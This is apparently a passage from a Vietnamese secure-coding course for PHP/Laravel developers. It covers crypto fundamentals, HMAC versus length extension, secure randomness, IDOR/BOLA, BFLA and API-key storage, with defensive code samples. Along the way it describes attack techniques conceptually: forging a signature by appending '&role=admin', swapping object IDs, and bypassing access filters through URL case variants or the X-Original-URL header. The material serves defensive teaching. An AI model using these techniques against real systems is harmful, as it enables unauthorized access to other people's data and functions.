| Giới hạn | Gần như mọi thứ user làm được trên trang | Chỉ những hành động làm được bằng một request đoán trước được toàn bộ tham số |
| Lỗ hổng nằm ở | Chỗ output không escape đúng ngữ cảnh, hoặc sink DOM nguy hiểm | Server tin cookie mà không kiểm tra request có thật do user chủ ý gửi |
| Chặn bằng | Escape theo ngữ cảnh, sanitize rich text, CSP, Trusted Types | CSRF token, Fetch Metadata/`Origin`, `SameSite`, không đổi state bằng GET |
| Quan hệ | Có XSS thì mọi biện pháp chống CSRF đều bị vượt: script đọc được token và gửi request same-origin | Chống CSRF tốt không giúp gì cho XSS |

Câu hỏi vặn hay gặp: "cookie đã `HttpOnly` và `SameSite=Strict`, còn cần lo XSS không?" Có. Cả hai
thuộc tính chỉ nói về việc cookie bị đọc hoặc bị gửi từ site **khác**; script XSS chạy ngay trên site
của bạn nên request của nó là same-origin, cookie vẫn đi kèm bình thường.

**Tóm tắt nhanh**

- Prepared statement tách khung câu lệnh khỏi dữ liệu nên dữ liệu không bao giờ được parse như SQL.
  Nó không giúp với tên cột/bảng và `ASC`/`DESC` (whitelist), và không giúp khi bạn tự nối chuỗi vào
  `*Raw`/`DB::raw` của Laravel. Nhớ cả second-order injection.
- XSS có ba loại (stored, reflected, DOM). Chặn bằng escape **theo ngữ cảnh**: Blade `{{ }}` chỉ lo
  HTML và thuộc tính có nháy; `href` từ user phải kiểm scheme; dữ liệu vào `<script>` dùng `Js::from`;
  rich text dùng sanitizer whitelist. CSP là lớp thứ hai.
- Chỗ lọt XSS quen thuộc: `{!! !!}`, `HtmlString`, thuộc tính không nháy, `javascript:` URL,
  `innerHTML`/`v-html`/`dangerouslySetInnerHTML`.
- CSRF lợi dụng việc trình duyệt tự gửi cookie. Chặn bằng synchronizer token hoặc signed double-submit,
  Fetch Metadata (`Sec-Fetch-Site`) kèm fallback `Origin`/token, `SameSite` làm lớp thêm; GET không
  đổi state. Laravel 13: `PreventRequestForgery` kiểm `Sec-Fetch-Site` trước, rồi fallback token (419).
- XSS đọc được response và vô hiệu mọi biện pháp chống CSRF; CSRF chỉ gửi được request mù.

**Nguồn**: [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) ·
[OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) ·
[OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) ·
[MDN browser-compat-data: CSP trusted-types](https://github.com/mdn/browser-compat-data/blob/main/http/headers/Content-Security-Policy.json) ·
[PortSwigger: SQL injection](https://portswigger.net/web-security/sql-injection) ·
[PortSwigger: Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) ·
[PortSwigger: CSRF](https://portswigger.net/web-security/csrf) ·
[Laravel: CSRF Protection](https://laravel.com/docs/13.x/csrf) ·
[Laravel: Blade, Displaying Unescaped Data](https://laravel.com/docs/13.x/blade#displaying-unescaped-data) ·
[Laravel: Query Builder](https://laravel.com/docs/13.x/queries)

---

### 1.4 Crypto cơ bản

Module này trả lời: encode, hash, HMAC, encrypt và sign khác nhau ở đâu, mỗi thứ bảo vệ được điều
gì, và gặp một tình huống cụ thể (webhook, token reset, số CCCD, JWT) thì chọn công cụ nào. Kèm
theo là hai lỗi hay gặp nhất trong code review: sinh token bằng hàm random thường, và tự chế MAC
bằng cách ghép secret vào trước message.

#### Sáu khái niệm hay bị nhầm

Cách dễ nhớ nhất là hỏi hai câu cho mỗi công cụ: "có cần bí mật (key) không?" và "nó bảo đảm điều
gì?". Có ba thứ một hệ thống thường muốn bảo đảm:

- *Confidentiality* (bí mật): người ngoài không đọc được nội dung.
- *Integrity* (toàn vẹn): nội dung không bị sửa mà không ai biết.
- *Authenticity* (xác thực nguồn): biết chắc ai đã tạo ra nội dung.

**Encode** (base64, base64url, URL encode, hex) chỉ đổi cách biểu diễn byte để đi qua được một kênh
(JSON, URL, email). Không có key, ai cũng giải ngược được, nên không bảo đảm gì cả.

```php
<?php
declare(strict_types=1);

echo base64_encode('xin chao'), PHP_EOL;   // eGluIGNoYW8=
echo base64_decode('eGluIGNoYW8='), PHP_EOL; // xin chao
```

*base64url* là biến thể dùng trong URL và JWT: thay `+` bằng `-`, `/` bằng `_`, và thường bỏ dấu
`=` đệm ở cuối. ⚠️ Thấy chuỗi "trông loằng ngoằng" trong cookie hay URL không có nghĩa là nó được
bảo vệ. Chuỗi bắt đầu bằng `eyJ` gần như chắc chắn là JSON đã base64 (`{"` theo sau là một chữ cái, như `{"a`, encode ra `eyJ...`).

**Hash** (SHA-256, SHA-3) là hàm một chiều: input bất kỳ, output độ dài cố định (SHA-256 ra 32
byte, tức 64 ký tự hex). Ba tính chất cần nhớ:

1. Cùng input luôn ra cùng output (deterministic).
2. Từ output không tìm lại được input (*preimage resistance*).
3. Rất khó tìm hai input khác nhau cho cùng output (*collision resistance*). MD5 và SHA-1 đã mất
   tính chất này, nên không dùng cho mục đích bảo mật mới.

Hash không có key, nên nó chỉ bảo đảm integrity khi bản thân hash được truyền qua kênh tin cậy
(ví dụ checksum file cài đặt công bố trên trang chính thức). Kẻ sửa được dữ liệu mà cũng sửa được
hash thì hash vô dụng. Hash dùng cho password là trường hợp riêng, cần hàm chậm có chủ đích
(module 1.1).

**HMAC** (Hash-based Message Authentication Code) là hash có trộn một secret chung. Chỉ ai biết
secret mới tạo được HMAC đúng, nên HMAC bảo đảm cả integrity lẫn authenticity (với điều kiện chỉ
hai bên biết secret). HMAC không che nội dung: message vẫn đi dạng rõ.

**Encrypt đối xứng** (AES-GCM, ChaCha20-Poly1305, XChaCha20-Poly1305): một key dùng cho cả mã hoá
và giải mã. Nhanh, dùng để mã hoá dữ liệu thật. Các thuật toán kể trên là *AEAD* (Authenticated
Encryption with Associated Data): vừa giấu nội dung vừa phát hiện được ciphertext bị sửa. OWASP
khuyến nghị AES với key tối thiểu 128 bit (ưu tiên 256 bit), dùng mode có xác thực như GCM hoặc CCM;
không dùng ECB.

**Encrypt bất đối xứng** (RSA-OAEP, ECIES): cặp key. Ai có public key cũng mã hoá được, chỉ người
giữ private key giải được. Chậm và giới hạn kích thước dữ liệu, nên thực tế dùng để trao đổi hoặc
bọc một key đối xứng, rồi key đối xứng mới mã hoá dữ liệu. OWASP khuyến nghị ưu tiên elliptic curve
(Curve25519); nếu buộc dùng RSA thì key tối thiểu 2048 bit với padding OAEP.

**Sign** (Ed25519, ECDSA, RSA-PSS): ký bằng private key, ai có public key cũng verify được. Khác
HMAC ở chỗ bên verify **không** tự tạo được chữ ký. Đây là nền của JWT RS256/ES256 (module 2.1),
ký bản release, ký commit.

| | Đảo ngược được? | Cần key? | Bảo đảm | Dùng cho |
|---|---|---|---|---|
| Encode (base64, URL encode) | Có, ai cũng làm được | Không | Không gì cả | Biểu diễn dữ liệu |
| Hash (SHA-256) | Không | Không | Integrity nếu hash đến qua kênh tin cậy | Checksum, fingerprint, lưu hash của token |
| HMAC | Không | Secret chung | Integrity + authenticity | Webhook, cookie ký, signed URL, JWT HS256 |
| Encrypt đối xứng (AES-GCM, XChaCha20-Poly1305) | Có, với key | Một key | Confidentiality (+ integrity nếu AEAD) | Mã hoá dữ liệu lưu trữ |
| Encrypt bất đối xứng (RSA-OAEP, ECIES) | Có, với private key | Cặp key | Confidentiality | Trao đổi/bọc key |
| Sign (Ed25519, ECDSA, RSA-PSS) | Verify bằng public key | Cặp key | Integrity + authenticity, bên verify không giả được | JWT RS256/ES256, ký release |

Áp vào sáu tình huống hay bị hỏi:

| Tình huống | Công cụ | Vì sao |
|---|---|---|
| Lưu password | Hash chậm: argon2id/bcrypt (`password_hash`) | Password dễ đoán, cần làm chậm việc đoán (module 1.1) |
| Xác minh webhook từ cổng thanh toán | HMAC-SHA256 trên raw body + `hash_equals` | Cần biết body không bị sửa và đúng là do bên kia gửi |
| Lưu số CCCD | Encrypt đối xứng AEAD, key ngoài DB | Cần đọc lại được giá trị gốc (hiển thị, đối soát) |
| Token reset password | CSPRNG sinh token, lưu SHA-256 của token | Token ngẫu nhiên entropy cao, hash nhanh là đủ (module 1.5) |
| Ký JWT cho nhiều service verify | Sign (ES256/EdDSA/RS256) | Service verify không được có khả năng ký |
| Truyền ảnh (dữ liệu nhị phân) qua URL | base64url, nếu cần chống sửa link thì thêm HMAC (signed URL) | Encode chỉ để URL chứa được byte; bảo mật là việc của HMAC |

⚠️ Lưu CCCD mà cần tìm kiếm theo số (ví dụ "đã có ai đăng ký CCCD này chưa") thì ciphertext của
AEAD không so được, vì mỗi lần mã hoá dùng nonce khác nhau nên ra kết quả khác. Cách thường dùng là
lưu thêm một cột HMAC của số CCCD (với key riêng) để tra. Chi tiết ở module 3.3.

#### Vì sao phải dùng HMAC

Cách tự chế hay gặp: `sha256($secret . $message)` với ý nghĩ "không biết secret thì không tính được
hash". Với SHA-256 (và SHA-1, SHA-512, MD5) ý nghĩ này sai vì *length extension attack*.

Cơ chế, ở mức ý tưởng:

```
SHA-256 xử lý dữ liệu theo khối 64 byte, mỗi khối cập nhật một "trạng thái" 256 bit:

state0 --[khối 1]--> state1 --[khối 2]--> state2 ... --[khối cuối + padding]--> stateN
                                                                                  |
                                                                   output hash = stateN
```

1. Output của SHA-256 chính là trạng thái bên trong sau khối cuối cùng.
2. Kẻ tấn công biết `H = sha256(secret || message)` và độ dài của secret (hoặc đoán thử vài giá
   trị).
3. Hắn lấy `H` làm trạng thái khởi đầu, cho hàm nén chạy tiếp trên phần dữ liệu hắn muốn thêm.
4. Kết quả là hash hợp lệ của `secret || message || padding || phần_thêm`, dù hắn không biết secret.
   (Phần `padding` là các byte đệm SHA-256 tự thêm ở cuối message gốc; chúng nằm lẫn vào message
   mới, nhưng nhiều parser bỏ qua được.)

Ví dụ: API nhận `?user=42&role=user&sig=sha256(secret . "user=42&role=user")`. Kẻ tấn công nối
thêm `&role=admin` và tính được `sig` mới mà server chấp nhận.

HMAC tránh được vì nó hash hai lần lồng nhau, mỗi lần trộn key theo một cách khác:

```
HMAC(K, m) = H( (K ⊕ opad) || H( (K ⊕ ipad) || m ) )
```

Hash bên trong có bị "nối dài" thì kẻ tấn công vẫn phải đi qua lớp hash bên ngoài, mà lớp này cần
key. SHA-3 cũng không bị length extension (cấu trúc khác hẳn), nhưng quy tắc thực dụng vẫn là: cần
MAC thì gọi hàm HMAC của thư viện, không tự ghép.

Trong PHP:

```php
<?php
declare(strict_types=1);

// Ví dụ lấy từ PHP manual: output cố định cho cùng data và key
echo hash_hmac('sha256', 'The quick brown fox jumped over the lazy dog.', 'secret'), PHP_EOL;
// 9c5c42422b03f0ee32949920649445e417b2c634050833c5165704b825c2a53b

function verifyWebhook(string $rawBody, string $signatureHex, string $secret): bool
{
    $expected = hash_hmac('sha256', $rawBody, $secret);
    // known_string (giá trị mình tính) đặt trước, chuỗi của user đặt sau
    return hash_equals($expected, $signatureHex);
}
```

Các chi tiết hay sai khi verify webhook:

- ⚠️ So bằng `===` hoặc `==` là lộ *timing* (module 1.1): so sánh thường dừng ở byte khác đầu tiên.
  `hash_equals` so hết chuỗi với thời gian không phụ thuộc nội dung. PHP manual nhấn mạnh truyền
  chuỗi của user vào tham số **thứ hai**. Nếu hai chuỗi khác độ dài, hàm trả `false` ngay và có thể
  lộ độ dài của chuỗi bí mật (với HMAC hex độ dài vốn cố định nên không sao).
- ⚠️ Tính HMAC trên **raw body** đúng như nhận được (`$request->getContent()` trong Laravel), không
  phải trên JSON đã `json_decode` rồi `json_encode` lại. Thứ tự key, khoảng trắng, cách escape
  Unicode đổi một byte là chữ ký lệch.
- ⚠️ HMAC chỉ chứng minh "body này do bên có secret tạo ra", không chống *replay* (kẻ tấn công gửi
  lại đúng request cũ). Nhiều nhà cung cấp ký kèm timestamp; bạn kiểm tra timestamp nằm trong một
  cửa sổ ngắn và/hoặc lưu id sự kiện đã xử lý.
- `hash_hmac` từ PHP 8.0 ném `ValueError` nếu tên thuật toán không tồn tại hoặc là hash không phải
  crypto (như `crc32`), thay vì trả `false` như trước.

#### Số ngẫu nhiên an toàn

Token reset password, session id, API key, CSRF token, OTP: tất cả an toàn chỉ khi **không ai đoán
được**. Hàm random thường (PRNG) được thiết kế để phân phối đều và nhanh, không phải để khó đoán.
*CSPRNG* (Cryptographically Secure Pseudo-Random Number Generator) thì đảm bảo: thấy bao nhiêu
output trước đó cũng không suy ra được output tiếp theo. CSPRNG của ngôn ngữ thường lấy entropy từ
hệ điều hành (trên Linux là `getrandom()` hoặc `/dev/urandom`).

| Ngôn ngữ | Không an toàn | An toàn (theo OWASP) |
|---|---|---|
| PHP | `rand()`, `mt_rand()`, `uniqid()` | `random_bytes()`, `random_int()`, `Random\Engine\Secure` (PHP 8.2+) |
| Java | `Math.random()`, `java.util.Random` | `java.security.SecureRandom` |
| Go | package `math/rand` | package `crypto/rand` |
| Node.js | `Math.random()` | `crypto.randomBytes()`, `crypto.randomInt()`, `crypto.randomUUID()` |

Vì sao các hàm bên trái đoán được:

- `mt_rand()` dùng Mersenne Twister với seed 32 bit. Có công cụ công khai brute force lại seed từ
  một vài output quan sát được, rồi từ seed tính ra mọi output tiếp theo.
- `uniqid()` tạo id từ thời gian hiện tại tính bằng micro giây. Kẻ tấn công biết khoảng thời gian
  bạn tạo token là thu hẹp được còn vài triệu khả năng.
- `Math.random()` của JS cũng là PRNG không an toàn; không dùng cho bất kỳ thứ gì cần bí mật.

Cách dùng đúng trong PHP:

```php
<?php
declare(strict_types=1);

$token = bin2hex(random_bytes(32));   // 32 byte ngẫu nhiên -> 64 ký tự hex, dùng cho token reset
$otp   = random_int(100000, 999999);  // OTP 6 chữ số, phân phối đều, không bị lệch như rand() % n

// Lưu hash của token, gửi token gốc cho user (module 1.1, 1.5)
$tokenHash = hash('sha256', $token);
```

- `random_bytes` trả về byte thô, có thể chứa ký tự không in được, nên thường đi kèm `bin2hex` hoặc
  base64url trước khi đưa vào URL/email. Theo PHP manual, hàm phù hợp cho cả secret dài hạn như
  key mã hoá; nếu không có nguồn entropy thì ném `Random\RandomException` (từ PHP 8.2), không bao
  giờ âm thầm trả dữ liệu yếu.
- 32 byte (256 bit) là mức phổ biến cho token và key. Token phải đủ dài để đoán mò vô vọng; đừng
  cắt ngắn chỉ vì URL "trông dài".
- Laravel `Str::random()` dựa trên `random_bytes`, dùng được cho token. UUID v4 chỉ an toàn khi được
  sinh bằng CSPRNG; UUID v1 dựa trên thời gian và địa chỉ MAC, không dùng làm bí mật.
- ⚠️ Lỗi thật hay gặp: `md5(time())`, `md5(uniqid())`, `sha1(mt_rand())`. Hash một giá trị đoán được
  thì kết quả vẫn đoán được, hash không thêm được chút entropy nào.

Đối chiếu: Go `crypto/rand.Read(b)` và Java `new SecureRandom().nextBytes(b)` là tương đương
`random_bytes`. Ở Go, tên package `math/rand` và `crypto/rand` chỉ khác một chữ, là chỗ hay import
nhầm.

#### Không tự chế crypto

"Tự chế" ở đây không chỉ là tự viết thuật toán (hiếm ai làm), mà phổ biến hơn là tự **ghép** các
mảnh đúng thành một tổng thể sai:

- Tự chọn *mode* của block cipher. AES chỉ mã hoá một khối 16 byte; mode là cách áp nó lên dữ liệu
  dài. ECB mã hoá từng khối độc lập nên khối giống nhau cho ciphertext giống nhau, lộ cấu trúc dữ
  liệu. CBC/CTR không tự phát hiện ciphertext bị sửa, phải ghép thêm MAC theo kiểu Encrypt-then-MAC,
  và ghép sai thứ tự là có lỗ hổng. AEAD (GCM, ChaCha20-Poly1305) gộp sẵn cả hai.
- Dùng lại *nonce* (số chỉ dùng một lần, đi kèm mỗi lần mã hoá) với cùng key. Với AES-GCM, lặp nonce
  là mất cả tính bí mật lẫn tính toàn vẹn. Chi tiết ở module 3.3.
- Dùng password người đặt trực tiếp làm key. Key phải sinh bằng CSPRNG, hoặc dẫn xuất từ password
  bằng KDF chậm.
- Tự viết so sánh chuỗi, tự viết padding, tự parse chữ ký.

Cách tránh là dùng thư viện cấp cao, loại đã chọn sẵn thuật toán, mode, độ dài nonce, và API khó
dùng sai:

- *libsodium*: có sẵn trong PHP (extension `sodium`) từ PHP 7.2.
- *Google Tink*: cho Java, Go và một số ngôn ngữ khác.
- Trong Laravel: `Crypt::encryptString()` / `Crypt::decryptString()` với `APP_KEY`, đã có MAC; chi
  tiết và cạm bẫy (xoay `APP_KEY`) ở module 2.8.

```php
<?php
declare(strict_types=1);

// libsodium secretbox: mã hoá đối xứng có xác thực, chỉ cần nhớ key và nonce
$key   = sodium_crypto_secretbox_keygen();                       // 32 byte từ CSPRNG
$nonce = random_bytes(SODIUM_CRYPTO_SECRETBOX_NONCEBYTES);       // 24 byte, mới cho MỖI lần mã hoá

$cipher = sodium_crypto_secretbox('079123456789', $nonce, $key);
$stored = base64_encode($nonce . $cipher);                       // nonce không bí mật, lưu cùng

$raw   = base64_decode($stored, true);
$plain = sodium_crypto_secretbox_open(
    substr($raw, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES),
    substr($raw, 0, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES),
    $key,
);
var_dump($plain); // string(12) "079123456789"; nếu ciphertext bị sửa thì là bool(false)
```

Key đặt ở đâu quan trọng không kém thuật toán. OWASP khuyến nghị: không hardcode trong source,
không commit vào git; tốt nhất dùng KMS/HSM/secret manager. Mô hình *envelope encryption* (key mã
hoá dữ liệu được bọc bởi một key khác nằm ở KMS) và việc rotate key thuộc module 3.3.

Mọi kết nối mạng dùng TLS; TLS chính là tổ hợp của các mảnh ở module này (trao đổi key bất đối
xứng, chữ ký trên certificate, AEAD cho dữ liệu). Chi tiết handshake ở
[plan 02: Networking](../02-networking.md).

**Tóm tắt nhanh**
- Encode không có key nên không bảo mật; hash không có key nên không chứng minh được nguồn; HMAC có
  secret chung; sign thì bên verify không giả được chữ ký.
- `sha256(secret . msg)` bị length extension; cần MAC thì dùng `hash_hmac`, so bằng `hash_equals`
  (chuỗi của user ở tham số thứ hai), tính trên raw body.
- Token, key, OTP sinh bằng `random_bytes`/`random_int`; không bao giờ dùng `rand`, `mt_rand`,
  `uniqid`, `md5(time())`.
- Mã hoá dữ liệu dùng AEAD qua thư viện cấp cao (libsodium, `Crypt` của Laravel), không tự chọn mode,
  không lặp nonce.
- Cần giá trị gốc thì encrypt; chỉ cần so khớp thì hash (hoặc HMAC).

**Nguồn**: [OWASP: Cryptographic Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html) ·
[PHP: random_bytes](https://www.php.net/manual/en/function.random-bytes.php) ·
[PHP: hash_hmac](https://www.php.net/manual/en/function.hash-hmac.php) ·
[PHP: hash_equals](https://www.php.net/manual/en/function.hash-equals.php) ·
*Serious Cryptography*, 2nd ed. (Aumasson), phần hash, MAC, randomness

---

### 1.5 Authentication, authorization và IDOR

Module này trả lời: vì sao "đã đăng nhập" không có nghĩa là "được phép", IDOR/BOLA xảy ra thế nào
trong một controller Laravel trông rất bình thường, sửa ở đâu cho triệt để, và vì sao API key chỉ
cần SHA-256 trong khi password thì phải dùng hash chậm.

#### Hai khái niệm

Mỗi request tới một endpoint cần qua ba câu hỏi, theo đúng thứ tự:

```
Request
  |
  v
[1. Authentication]  Bạn là ai?            -> sai: 401 Unauthorized
  |                   (password, session, token, API key)
  v
[2. Session/token]   Request này có đúng của người đã xác thực không?
  |
  v
[3. Authorization]   Bạn có được làm việc NÀY với object NÀY không?  -> sai: 403 (hoặc 404)
  |
  v
Xử lý nghiệp vụ
```

- *Authentication* (xác thực, hay viết tắt *authn*) trả lời "bạn là ai". Kết quả là một danh tính:
  user id 42.
- *Authorization* (phân quyền, *authz*) trả lời "danh tính đó được làm gì". Kết quả là có/không cho
  một hành động cụ thể trên một resource cụ thể.
- ⚠️ Tên mã HTTP gây nhầm: `401 Unauthorized` thực chất là "chưa xác thực" (thiếu hoặc sai
  credential), còn `403 Forbidden` mới là "đã biết bạn là ai nhưng không cho phép".

PortSwigger chia authorization (họ gọi là *access control*) thành ba chiều, dùng làm khung khi
review code:

| Loại | Hỏi gì | Ví dụ lỗi |
|---|---|---|
| *Vertical* | Loại user này có được dùng chức năng này không? | User thường gọi được API xoá user của admin |
| *Horizontal* | User này có được đụng vào resource này không? | User A xem được đơn của user B |
| *Context-dependent* | Hành động này có hợp lệ ở trạng thái hiện tại không? | Sửa giỏ hàng sau khi đã thanh toán; nhảy thẳng tới bước 3 của quy trình nhiều bước |

Lỗi gốc chung: code chỉ làm bước 1 rồi coi như xong. Middleware `auth` của Laravel chỉ trả lời câu
"đã đăng nhập chưa"; nó không biết gì về việc đơn hàng nào thuộc ai.

#### IDOR / BOLA

*IDOR* (Insecure Direct Object Reference) là khi app dùng id do client gửi lên để lấy object mà
không kiểm tra quyền trên **chính object đó**. OWASP API Security Top 10 gọi cùng hiện tượng này là
*BOLA* (Broken Object Level Authorization) và xếp nó hạng đầu (API1:2023), với đánh giá: dễ khai
thác, rất phổ biến, dễ phát hiện. Theo IDOR Prevention Cheat Sheet, IDOR cần đủ ba thành phần: một
object (tài khoản, tài liệu, ticket), một tham chiếu tới nó (id, UUID, slug, tên file), và việc
**thiếu** kiểm tra quyền ở mức object.

Id có thể nằm ở bất cứ đâu client kiểm soát được:

- Path: `GET /orders/123` đổi thành `/orders/124`.
- Query string: `?invoice_id=...`.
- Field ẩn trong form: `<input type="hidden" name="user_id" value="12345">`.
- Tên file: `/documents/annual-report.pdf` đổi thành `/documents/financial-statement.pdf`.
- Body JSON, header, biến của GraphQL mutation.

Các ví dụ thật mà OWASP API Top 10 nêu: endpoint `/shops/{shopName}/revenue_data.json` cho phép
đọc doanh thu của hàng nghìn cửa hàng chỉ bằng cách đổi tên shop; API điều khiển xe từ xa không
kiểm tra số VIN có thuộc chủ tài khoản không; mutation GraphQL xoá tài liệu chỉ theo id.

Vì sao lỗi này phổ biến và scanner không bắt được: request khai thác **hoàn toàn hợp lệ** về cú
pháp, dùng token thật của một user thật. Chỉ người hiểu nghiệp vụ mới biết "user 7 không được thấy
đơn 124".

Trong Laravel, IDOR thường trông như sau:

```php
<?php
declare(strict_types=1);

// SAI: route có middleware auth, nhưng ai đăng nhập cũng xem được mọi đơn
public function show(int $id): OrderResource
{
    $order = Order::findOrFail($id);          // WHERE id = ?
    return new OrderResource($order);
}

// SAI, dạng khó thấy hơn: implicit route model binding lấy Order theo id, không quan tâm chủ
public function update(UpdateOrderRequest $request, Order $order): OrderResource
{
    $order->update($request->validated());
    return new OrderResource($order);
}
```

Có hai cách sửa, thường dùng kết hợp:

```php
<?php
declare(strict_types=1);

// Cách 1: scope query theo user hiện tại
public function show(Request $request, int $id): OrderResource
{
    $order = $request->user()->orders()->findOrFail($id);   // WHERE id = ? AND user_id = ?
    return new OrderResource($order);
}

// Cách 2: Policy, cần khi quy tắc phức tạp hơn "thuộc về tôi"
// app/Policies/OrderPolicy.php
final class OrderPolicy
{
    public function update(User $user, Order $order): bool
    {
        return $order->user_id === $user->id && $order->status === 'pending';
    }
}

// Controller
public function update(UpdateOrderRequest $request, Order $order): OrderResource
{
    Gate::authorize('update', $order);    // không được phép thì ném exception, trả 403
    $order->update($request->validated());
    return new OrderResource($order);
}
```

- Cách 1 có thêm lợi ích: object không thuộc user thì trả 404, không tiết lộ "đơn 124 có tồn tại".
- Cách 2 gom quy tắc về một chỗ, và quy tắc có thể dùng thuộc tính khác ngoài chủ sở hữu (trạng
  thái đơn, chi nhánh...). Chi tiết Gate/Policy ở module 2.5.
- ⚠️ So sánh `$order->user_id === $user->id` cần hai vế cùng kiểu. Nếu một vế về tới PHP dưới dạng
  string (tuỳ driver và cast) thì `===` luôn `false`. Đây là từ chối nhầm chứ không phải lỗ hổng,
  nhưng hay khiến dev đổi sang `==` cho "chạy được". Sửa đúng là khai cast `'user_id' => 'integer'`
  trong model.

Những chỗ hay bị bỏ sót:

- ⚠️ Chỉ kiểm tra ở endpoint đọc, quên endpoint ghi, xoá, export, tải file đính kèm. OWASP khuyên
  test đủ các thao tác đọc, tạo, sửa, xoá, export và chức năng quản trị với nhiều tài khoản khác
  nhau.
- ⚠️ Nhận `user_id` từ request body để gán chủ sở hữu (`Order::create($request->all())`). Chủ sở
  hữu phải lấy từ session/token (`$request->user()->id`), không bao giờ từ input.
- ⚠️ Chỉ so "user id trong URL" với "user id trong session". OWASP API Top 10 lưu ý cách này chỉ
  xử lý được một phần nhỏ trường hợp; object thường thuộc về tổ chức, dự án, cửa hàng, không phải
  trực tiếp user.
- ⚠️ Quy trình nhiều bước chỉ kiểm tra ở bước đầu. Kẻ tấn công gửi thẳng request của bước cuối.
- ⚠️ File tĩnh và object storage (S3): link public không có kiểm tra quyền. Dùng signed URL có hạn,
  sinh ra sau khi đã kiểm tra quyền.

⚠️ UUID thay cho id tự tăng không phải là cách sửa. OWASP API Top 10 có khuyên dùng giá trị ngẫu
nhiên, khó đoán làm id, nhưng cả OWASP lẫn PortSwigger đều coi đó chỉ là lớp phòng thủ thêm
(*defense in depth*): id vẫn lọt qua URL được chia sẻ, log, email, response của API khác (danh sách
bình luận trả kèm UUID của tác giả). Kiểm tra quyền vẫn bắt buộc.

#### BFLA và nguyên tắc mặc định

*BFLA* (Broken Function Level Authorization, API5:2023) là lỗi theo chiều dọc: user gọi được chức
năng không dành cho vai trò của mình. Các dạng PortSwigger mô tả:

- *Chức năng không được bảo vệ*: trang admin ở URL đoán được (`/admin`), hoặc URL "bí mật" nhưng
  nằm trong file JS mà ai cũng tải được, hoặc nằm trong `robots.txt`.
- *Quyền đặt ở chỗ client sửa được*: cookie `admin=true`, tham số `?role=1`, field ẩn. Server tin
  giá trị đó.
- *Chỉ ẩn nút ở UI*: frontend không hiện nút "Xoá user", nhưng `DELETE /admin/users/1` vẫn chạy
  khi gọi thẳng.
- *Lệch giữa tầng chặn và tầng xử lý*: tầng trước (proxy, WAF) chặn `/admin/deleteUser`, nhưng
  backend cũng chấp nhận `/ADMIN/DELETEUSER`, `/admin/deleteUser/`, method khác, hoặc header ghi đè
  URL như `X-Original-URL`.
- *Tin header client gửi*: kiểm tra `Referer` hay vị trí địa lý để phân quyền. Client giả được hết.

Nguyên tắc thiết kế chống cả BOLA lẫn BFLA (tổng hợp từ OWASP Authorization Cheat Sheet và
PortSwigger):

1. *Deny by default*: mặc định từ chối, chỉ cho phép thứ được khai rõ. Route mới thêm mà quên khai
   quyền thì phải bị chặn, không phải được mở. Trong Laravel, `Gate::allows()` với một ability
   chưa định nghĩa trả về `false`; áp dụng cùng tinh thần cho route: gắn middleware quyền ở cấp
   group thay vì từng route.
2. *Kiểm tra ở mọi request, ở server*: logic ở client chỉ là UX. Một chỗ quên kiểm tra là đủ lọt.
   Dùng cơ chế tập trung (middleware, Policy) thay vì rải `if` trong controller.
3. *Least privilege*: chỉ cấp quyền tối thiểu. Cấp thì dễ, thu hồi thì khó; định kỳ rà soát quyền
   bị tích luỹ dần (*privilege creep*).
4. *Fail secure* (thoát an toàn): khi việc kiểm tra quyền lỗi (exception, service phân quyền
   timeout) thì kết quả là từ chối, và thông báo lỗi không lộ thông tin nội bộ.
5. *Log* các lần bị từ chối để phát hiện ai đang dò id.
6. *Test tự động*: viết test "user B gọi API trên object của user A thì nhận 403/404" cho mọi
   endpoint có id.

Fail secure trong code:

```php
<?php
declare(strict_types=1);

function canAccess(User $user, Document $doc, PermissionClient $client): bool
{
    try {
        return $client->check($user->id, 'read', $doc->id) === true;
    } catch (Throwable $e) {
        report($e);
        return false;   // lỗi thì từ chối; KHÔNG return true "để user khỏi bị chặn"
    }
}
```

⚠️ `=== true` ở trên có chủ đích: nếu client trả về một chuỗi hay mảng lỗi thì không bị coi là
"truthy, cho qua".

#### API key

API key là credential cho máy (script, server đối tác) thay vì cho người. Quy tắc tạo và lưu:

1. Sinh bằng CSPRNG, đủ dài (ví dụ 32 byte ngẫu nhiên, module 1.4).
2. Gắn *prefix* nhận dạng, ví dụ `sk_live_...`, `sk_test_...`. Prefix giúp secret scanner (module
   3.4) nhận ra key khi bị commit lên git, và giúp người đọc log biết đó là key gì, môi trường nào.
   GitHub làm tương tự với token dạng `ghp_...`.
3. Lưu **hash** trong DB, không lưu key gốc. SHA-256 là đủ.
4. Chỉ hiện key gốc cho user **một lần** lúc tạo. Mất thì tạo key mới.
5. Mỗi key có scope (tập quyền hẹp), hạn dùng, và ghi lại lần dùng cuối.
6. Cho phép nhiều key cùng lúc để *rotate*: tạo key mới, chuyển hệ thống sang, rồi thu hồi key cũ,
   không gián đoạn.

```php
<?php
declare(strict_types=1);

// Tạo key
$plain = 'sk_live_' . bin2hex(random_bytes(32));
ApiKey::create([
    'user_id'     => $user->id,
    'prefix'      => substr($plain, 0, 12),          // để hiển thị "sk_live_ab12..." trong UI
    'key_hash'    => hash('sha256', $plain),          // cột có UNIQUE index
    'scopes'      => ['orders:read'],
    'expires_at'  => now()->addDays(90),
]);
// Trả $plain cho user đúng một lần

// Xác thực request
$hash = hash('sha256', $request->bearerToken() ?? '');
$key  = ApiKey::where('key_hash', $hash)->where('expires_at', '>', now())->first();
```

Vì sao SHA-256 là đủ cho API key mà không đủ cho password:

| | Password | API key ngẫu nhiên 32 byte |
|---|---|---|
| Ai tạo | Con người | CSPRNG |
| Không gian đoán thực tế | Nhỏ: danh sách password phổ biến, biến thể | 2^256 khả năng, không có "key phổ biến" |
| Kẻ có hash làm gì | Hash thử hàng tỷ password phổ biến mỗi giây trên GPU | Hash thử bao nhiêu cũng không chạm được vào không gian 2^256 |
| Hàm hash cần | Chậm có chủ đích + salt (argon2id, bcrypt) | Nhanh (SHA-256), không cần salt |
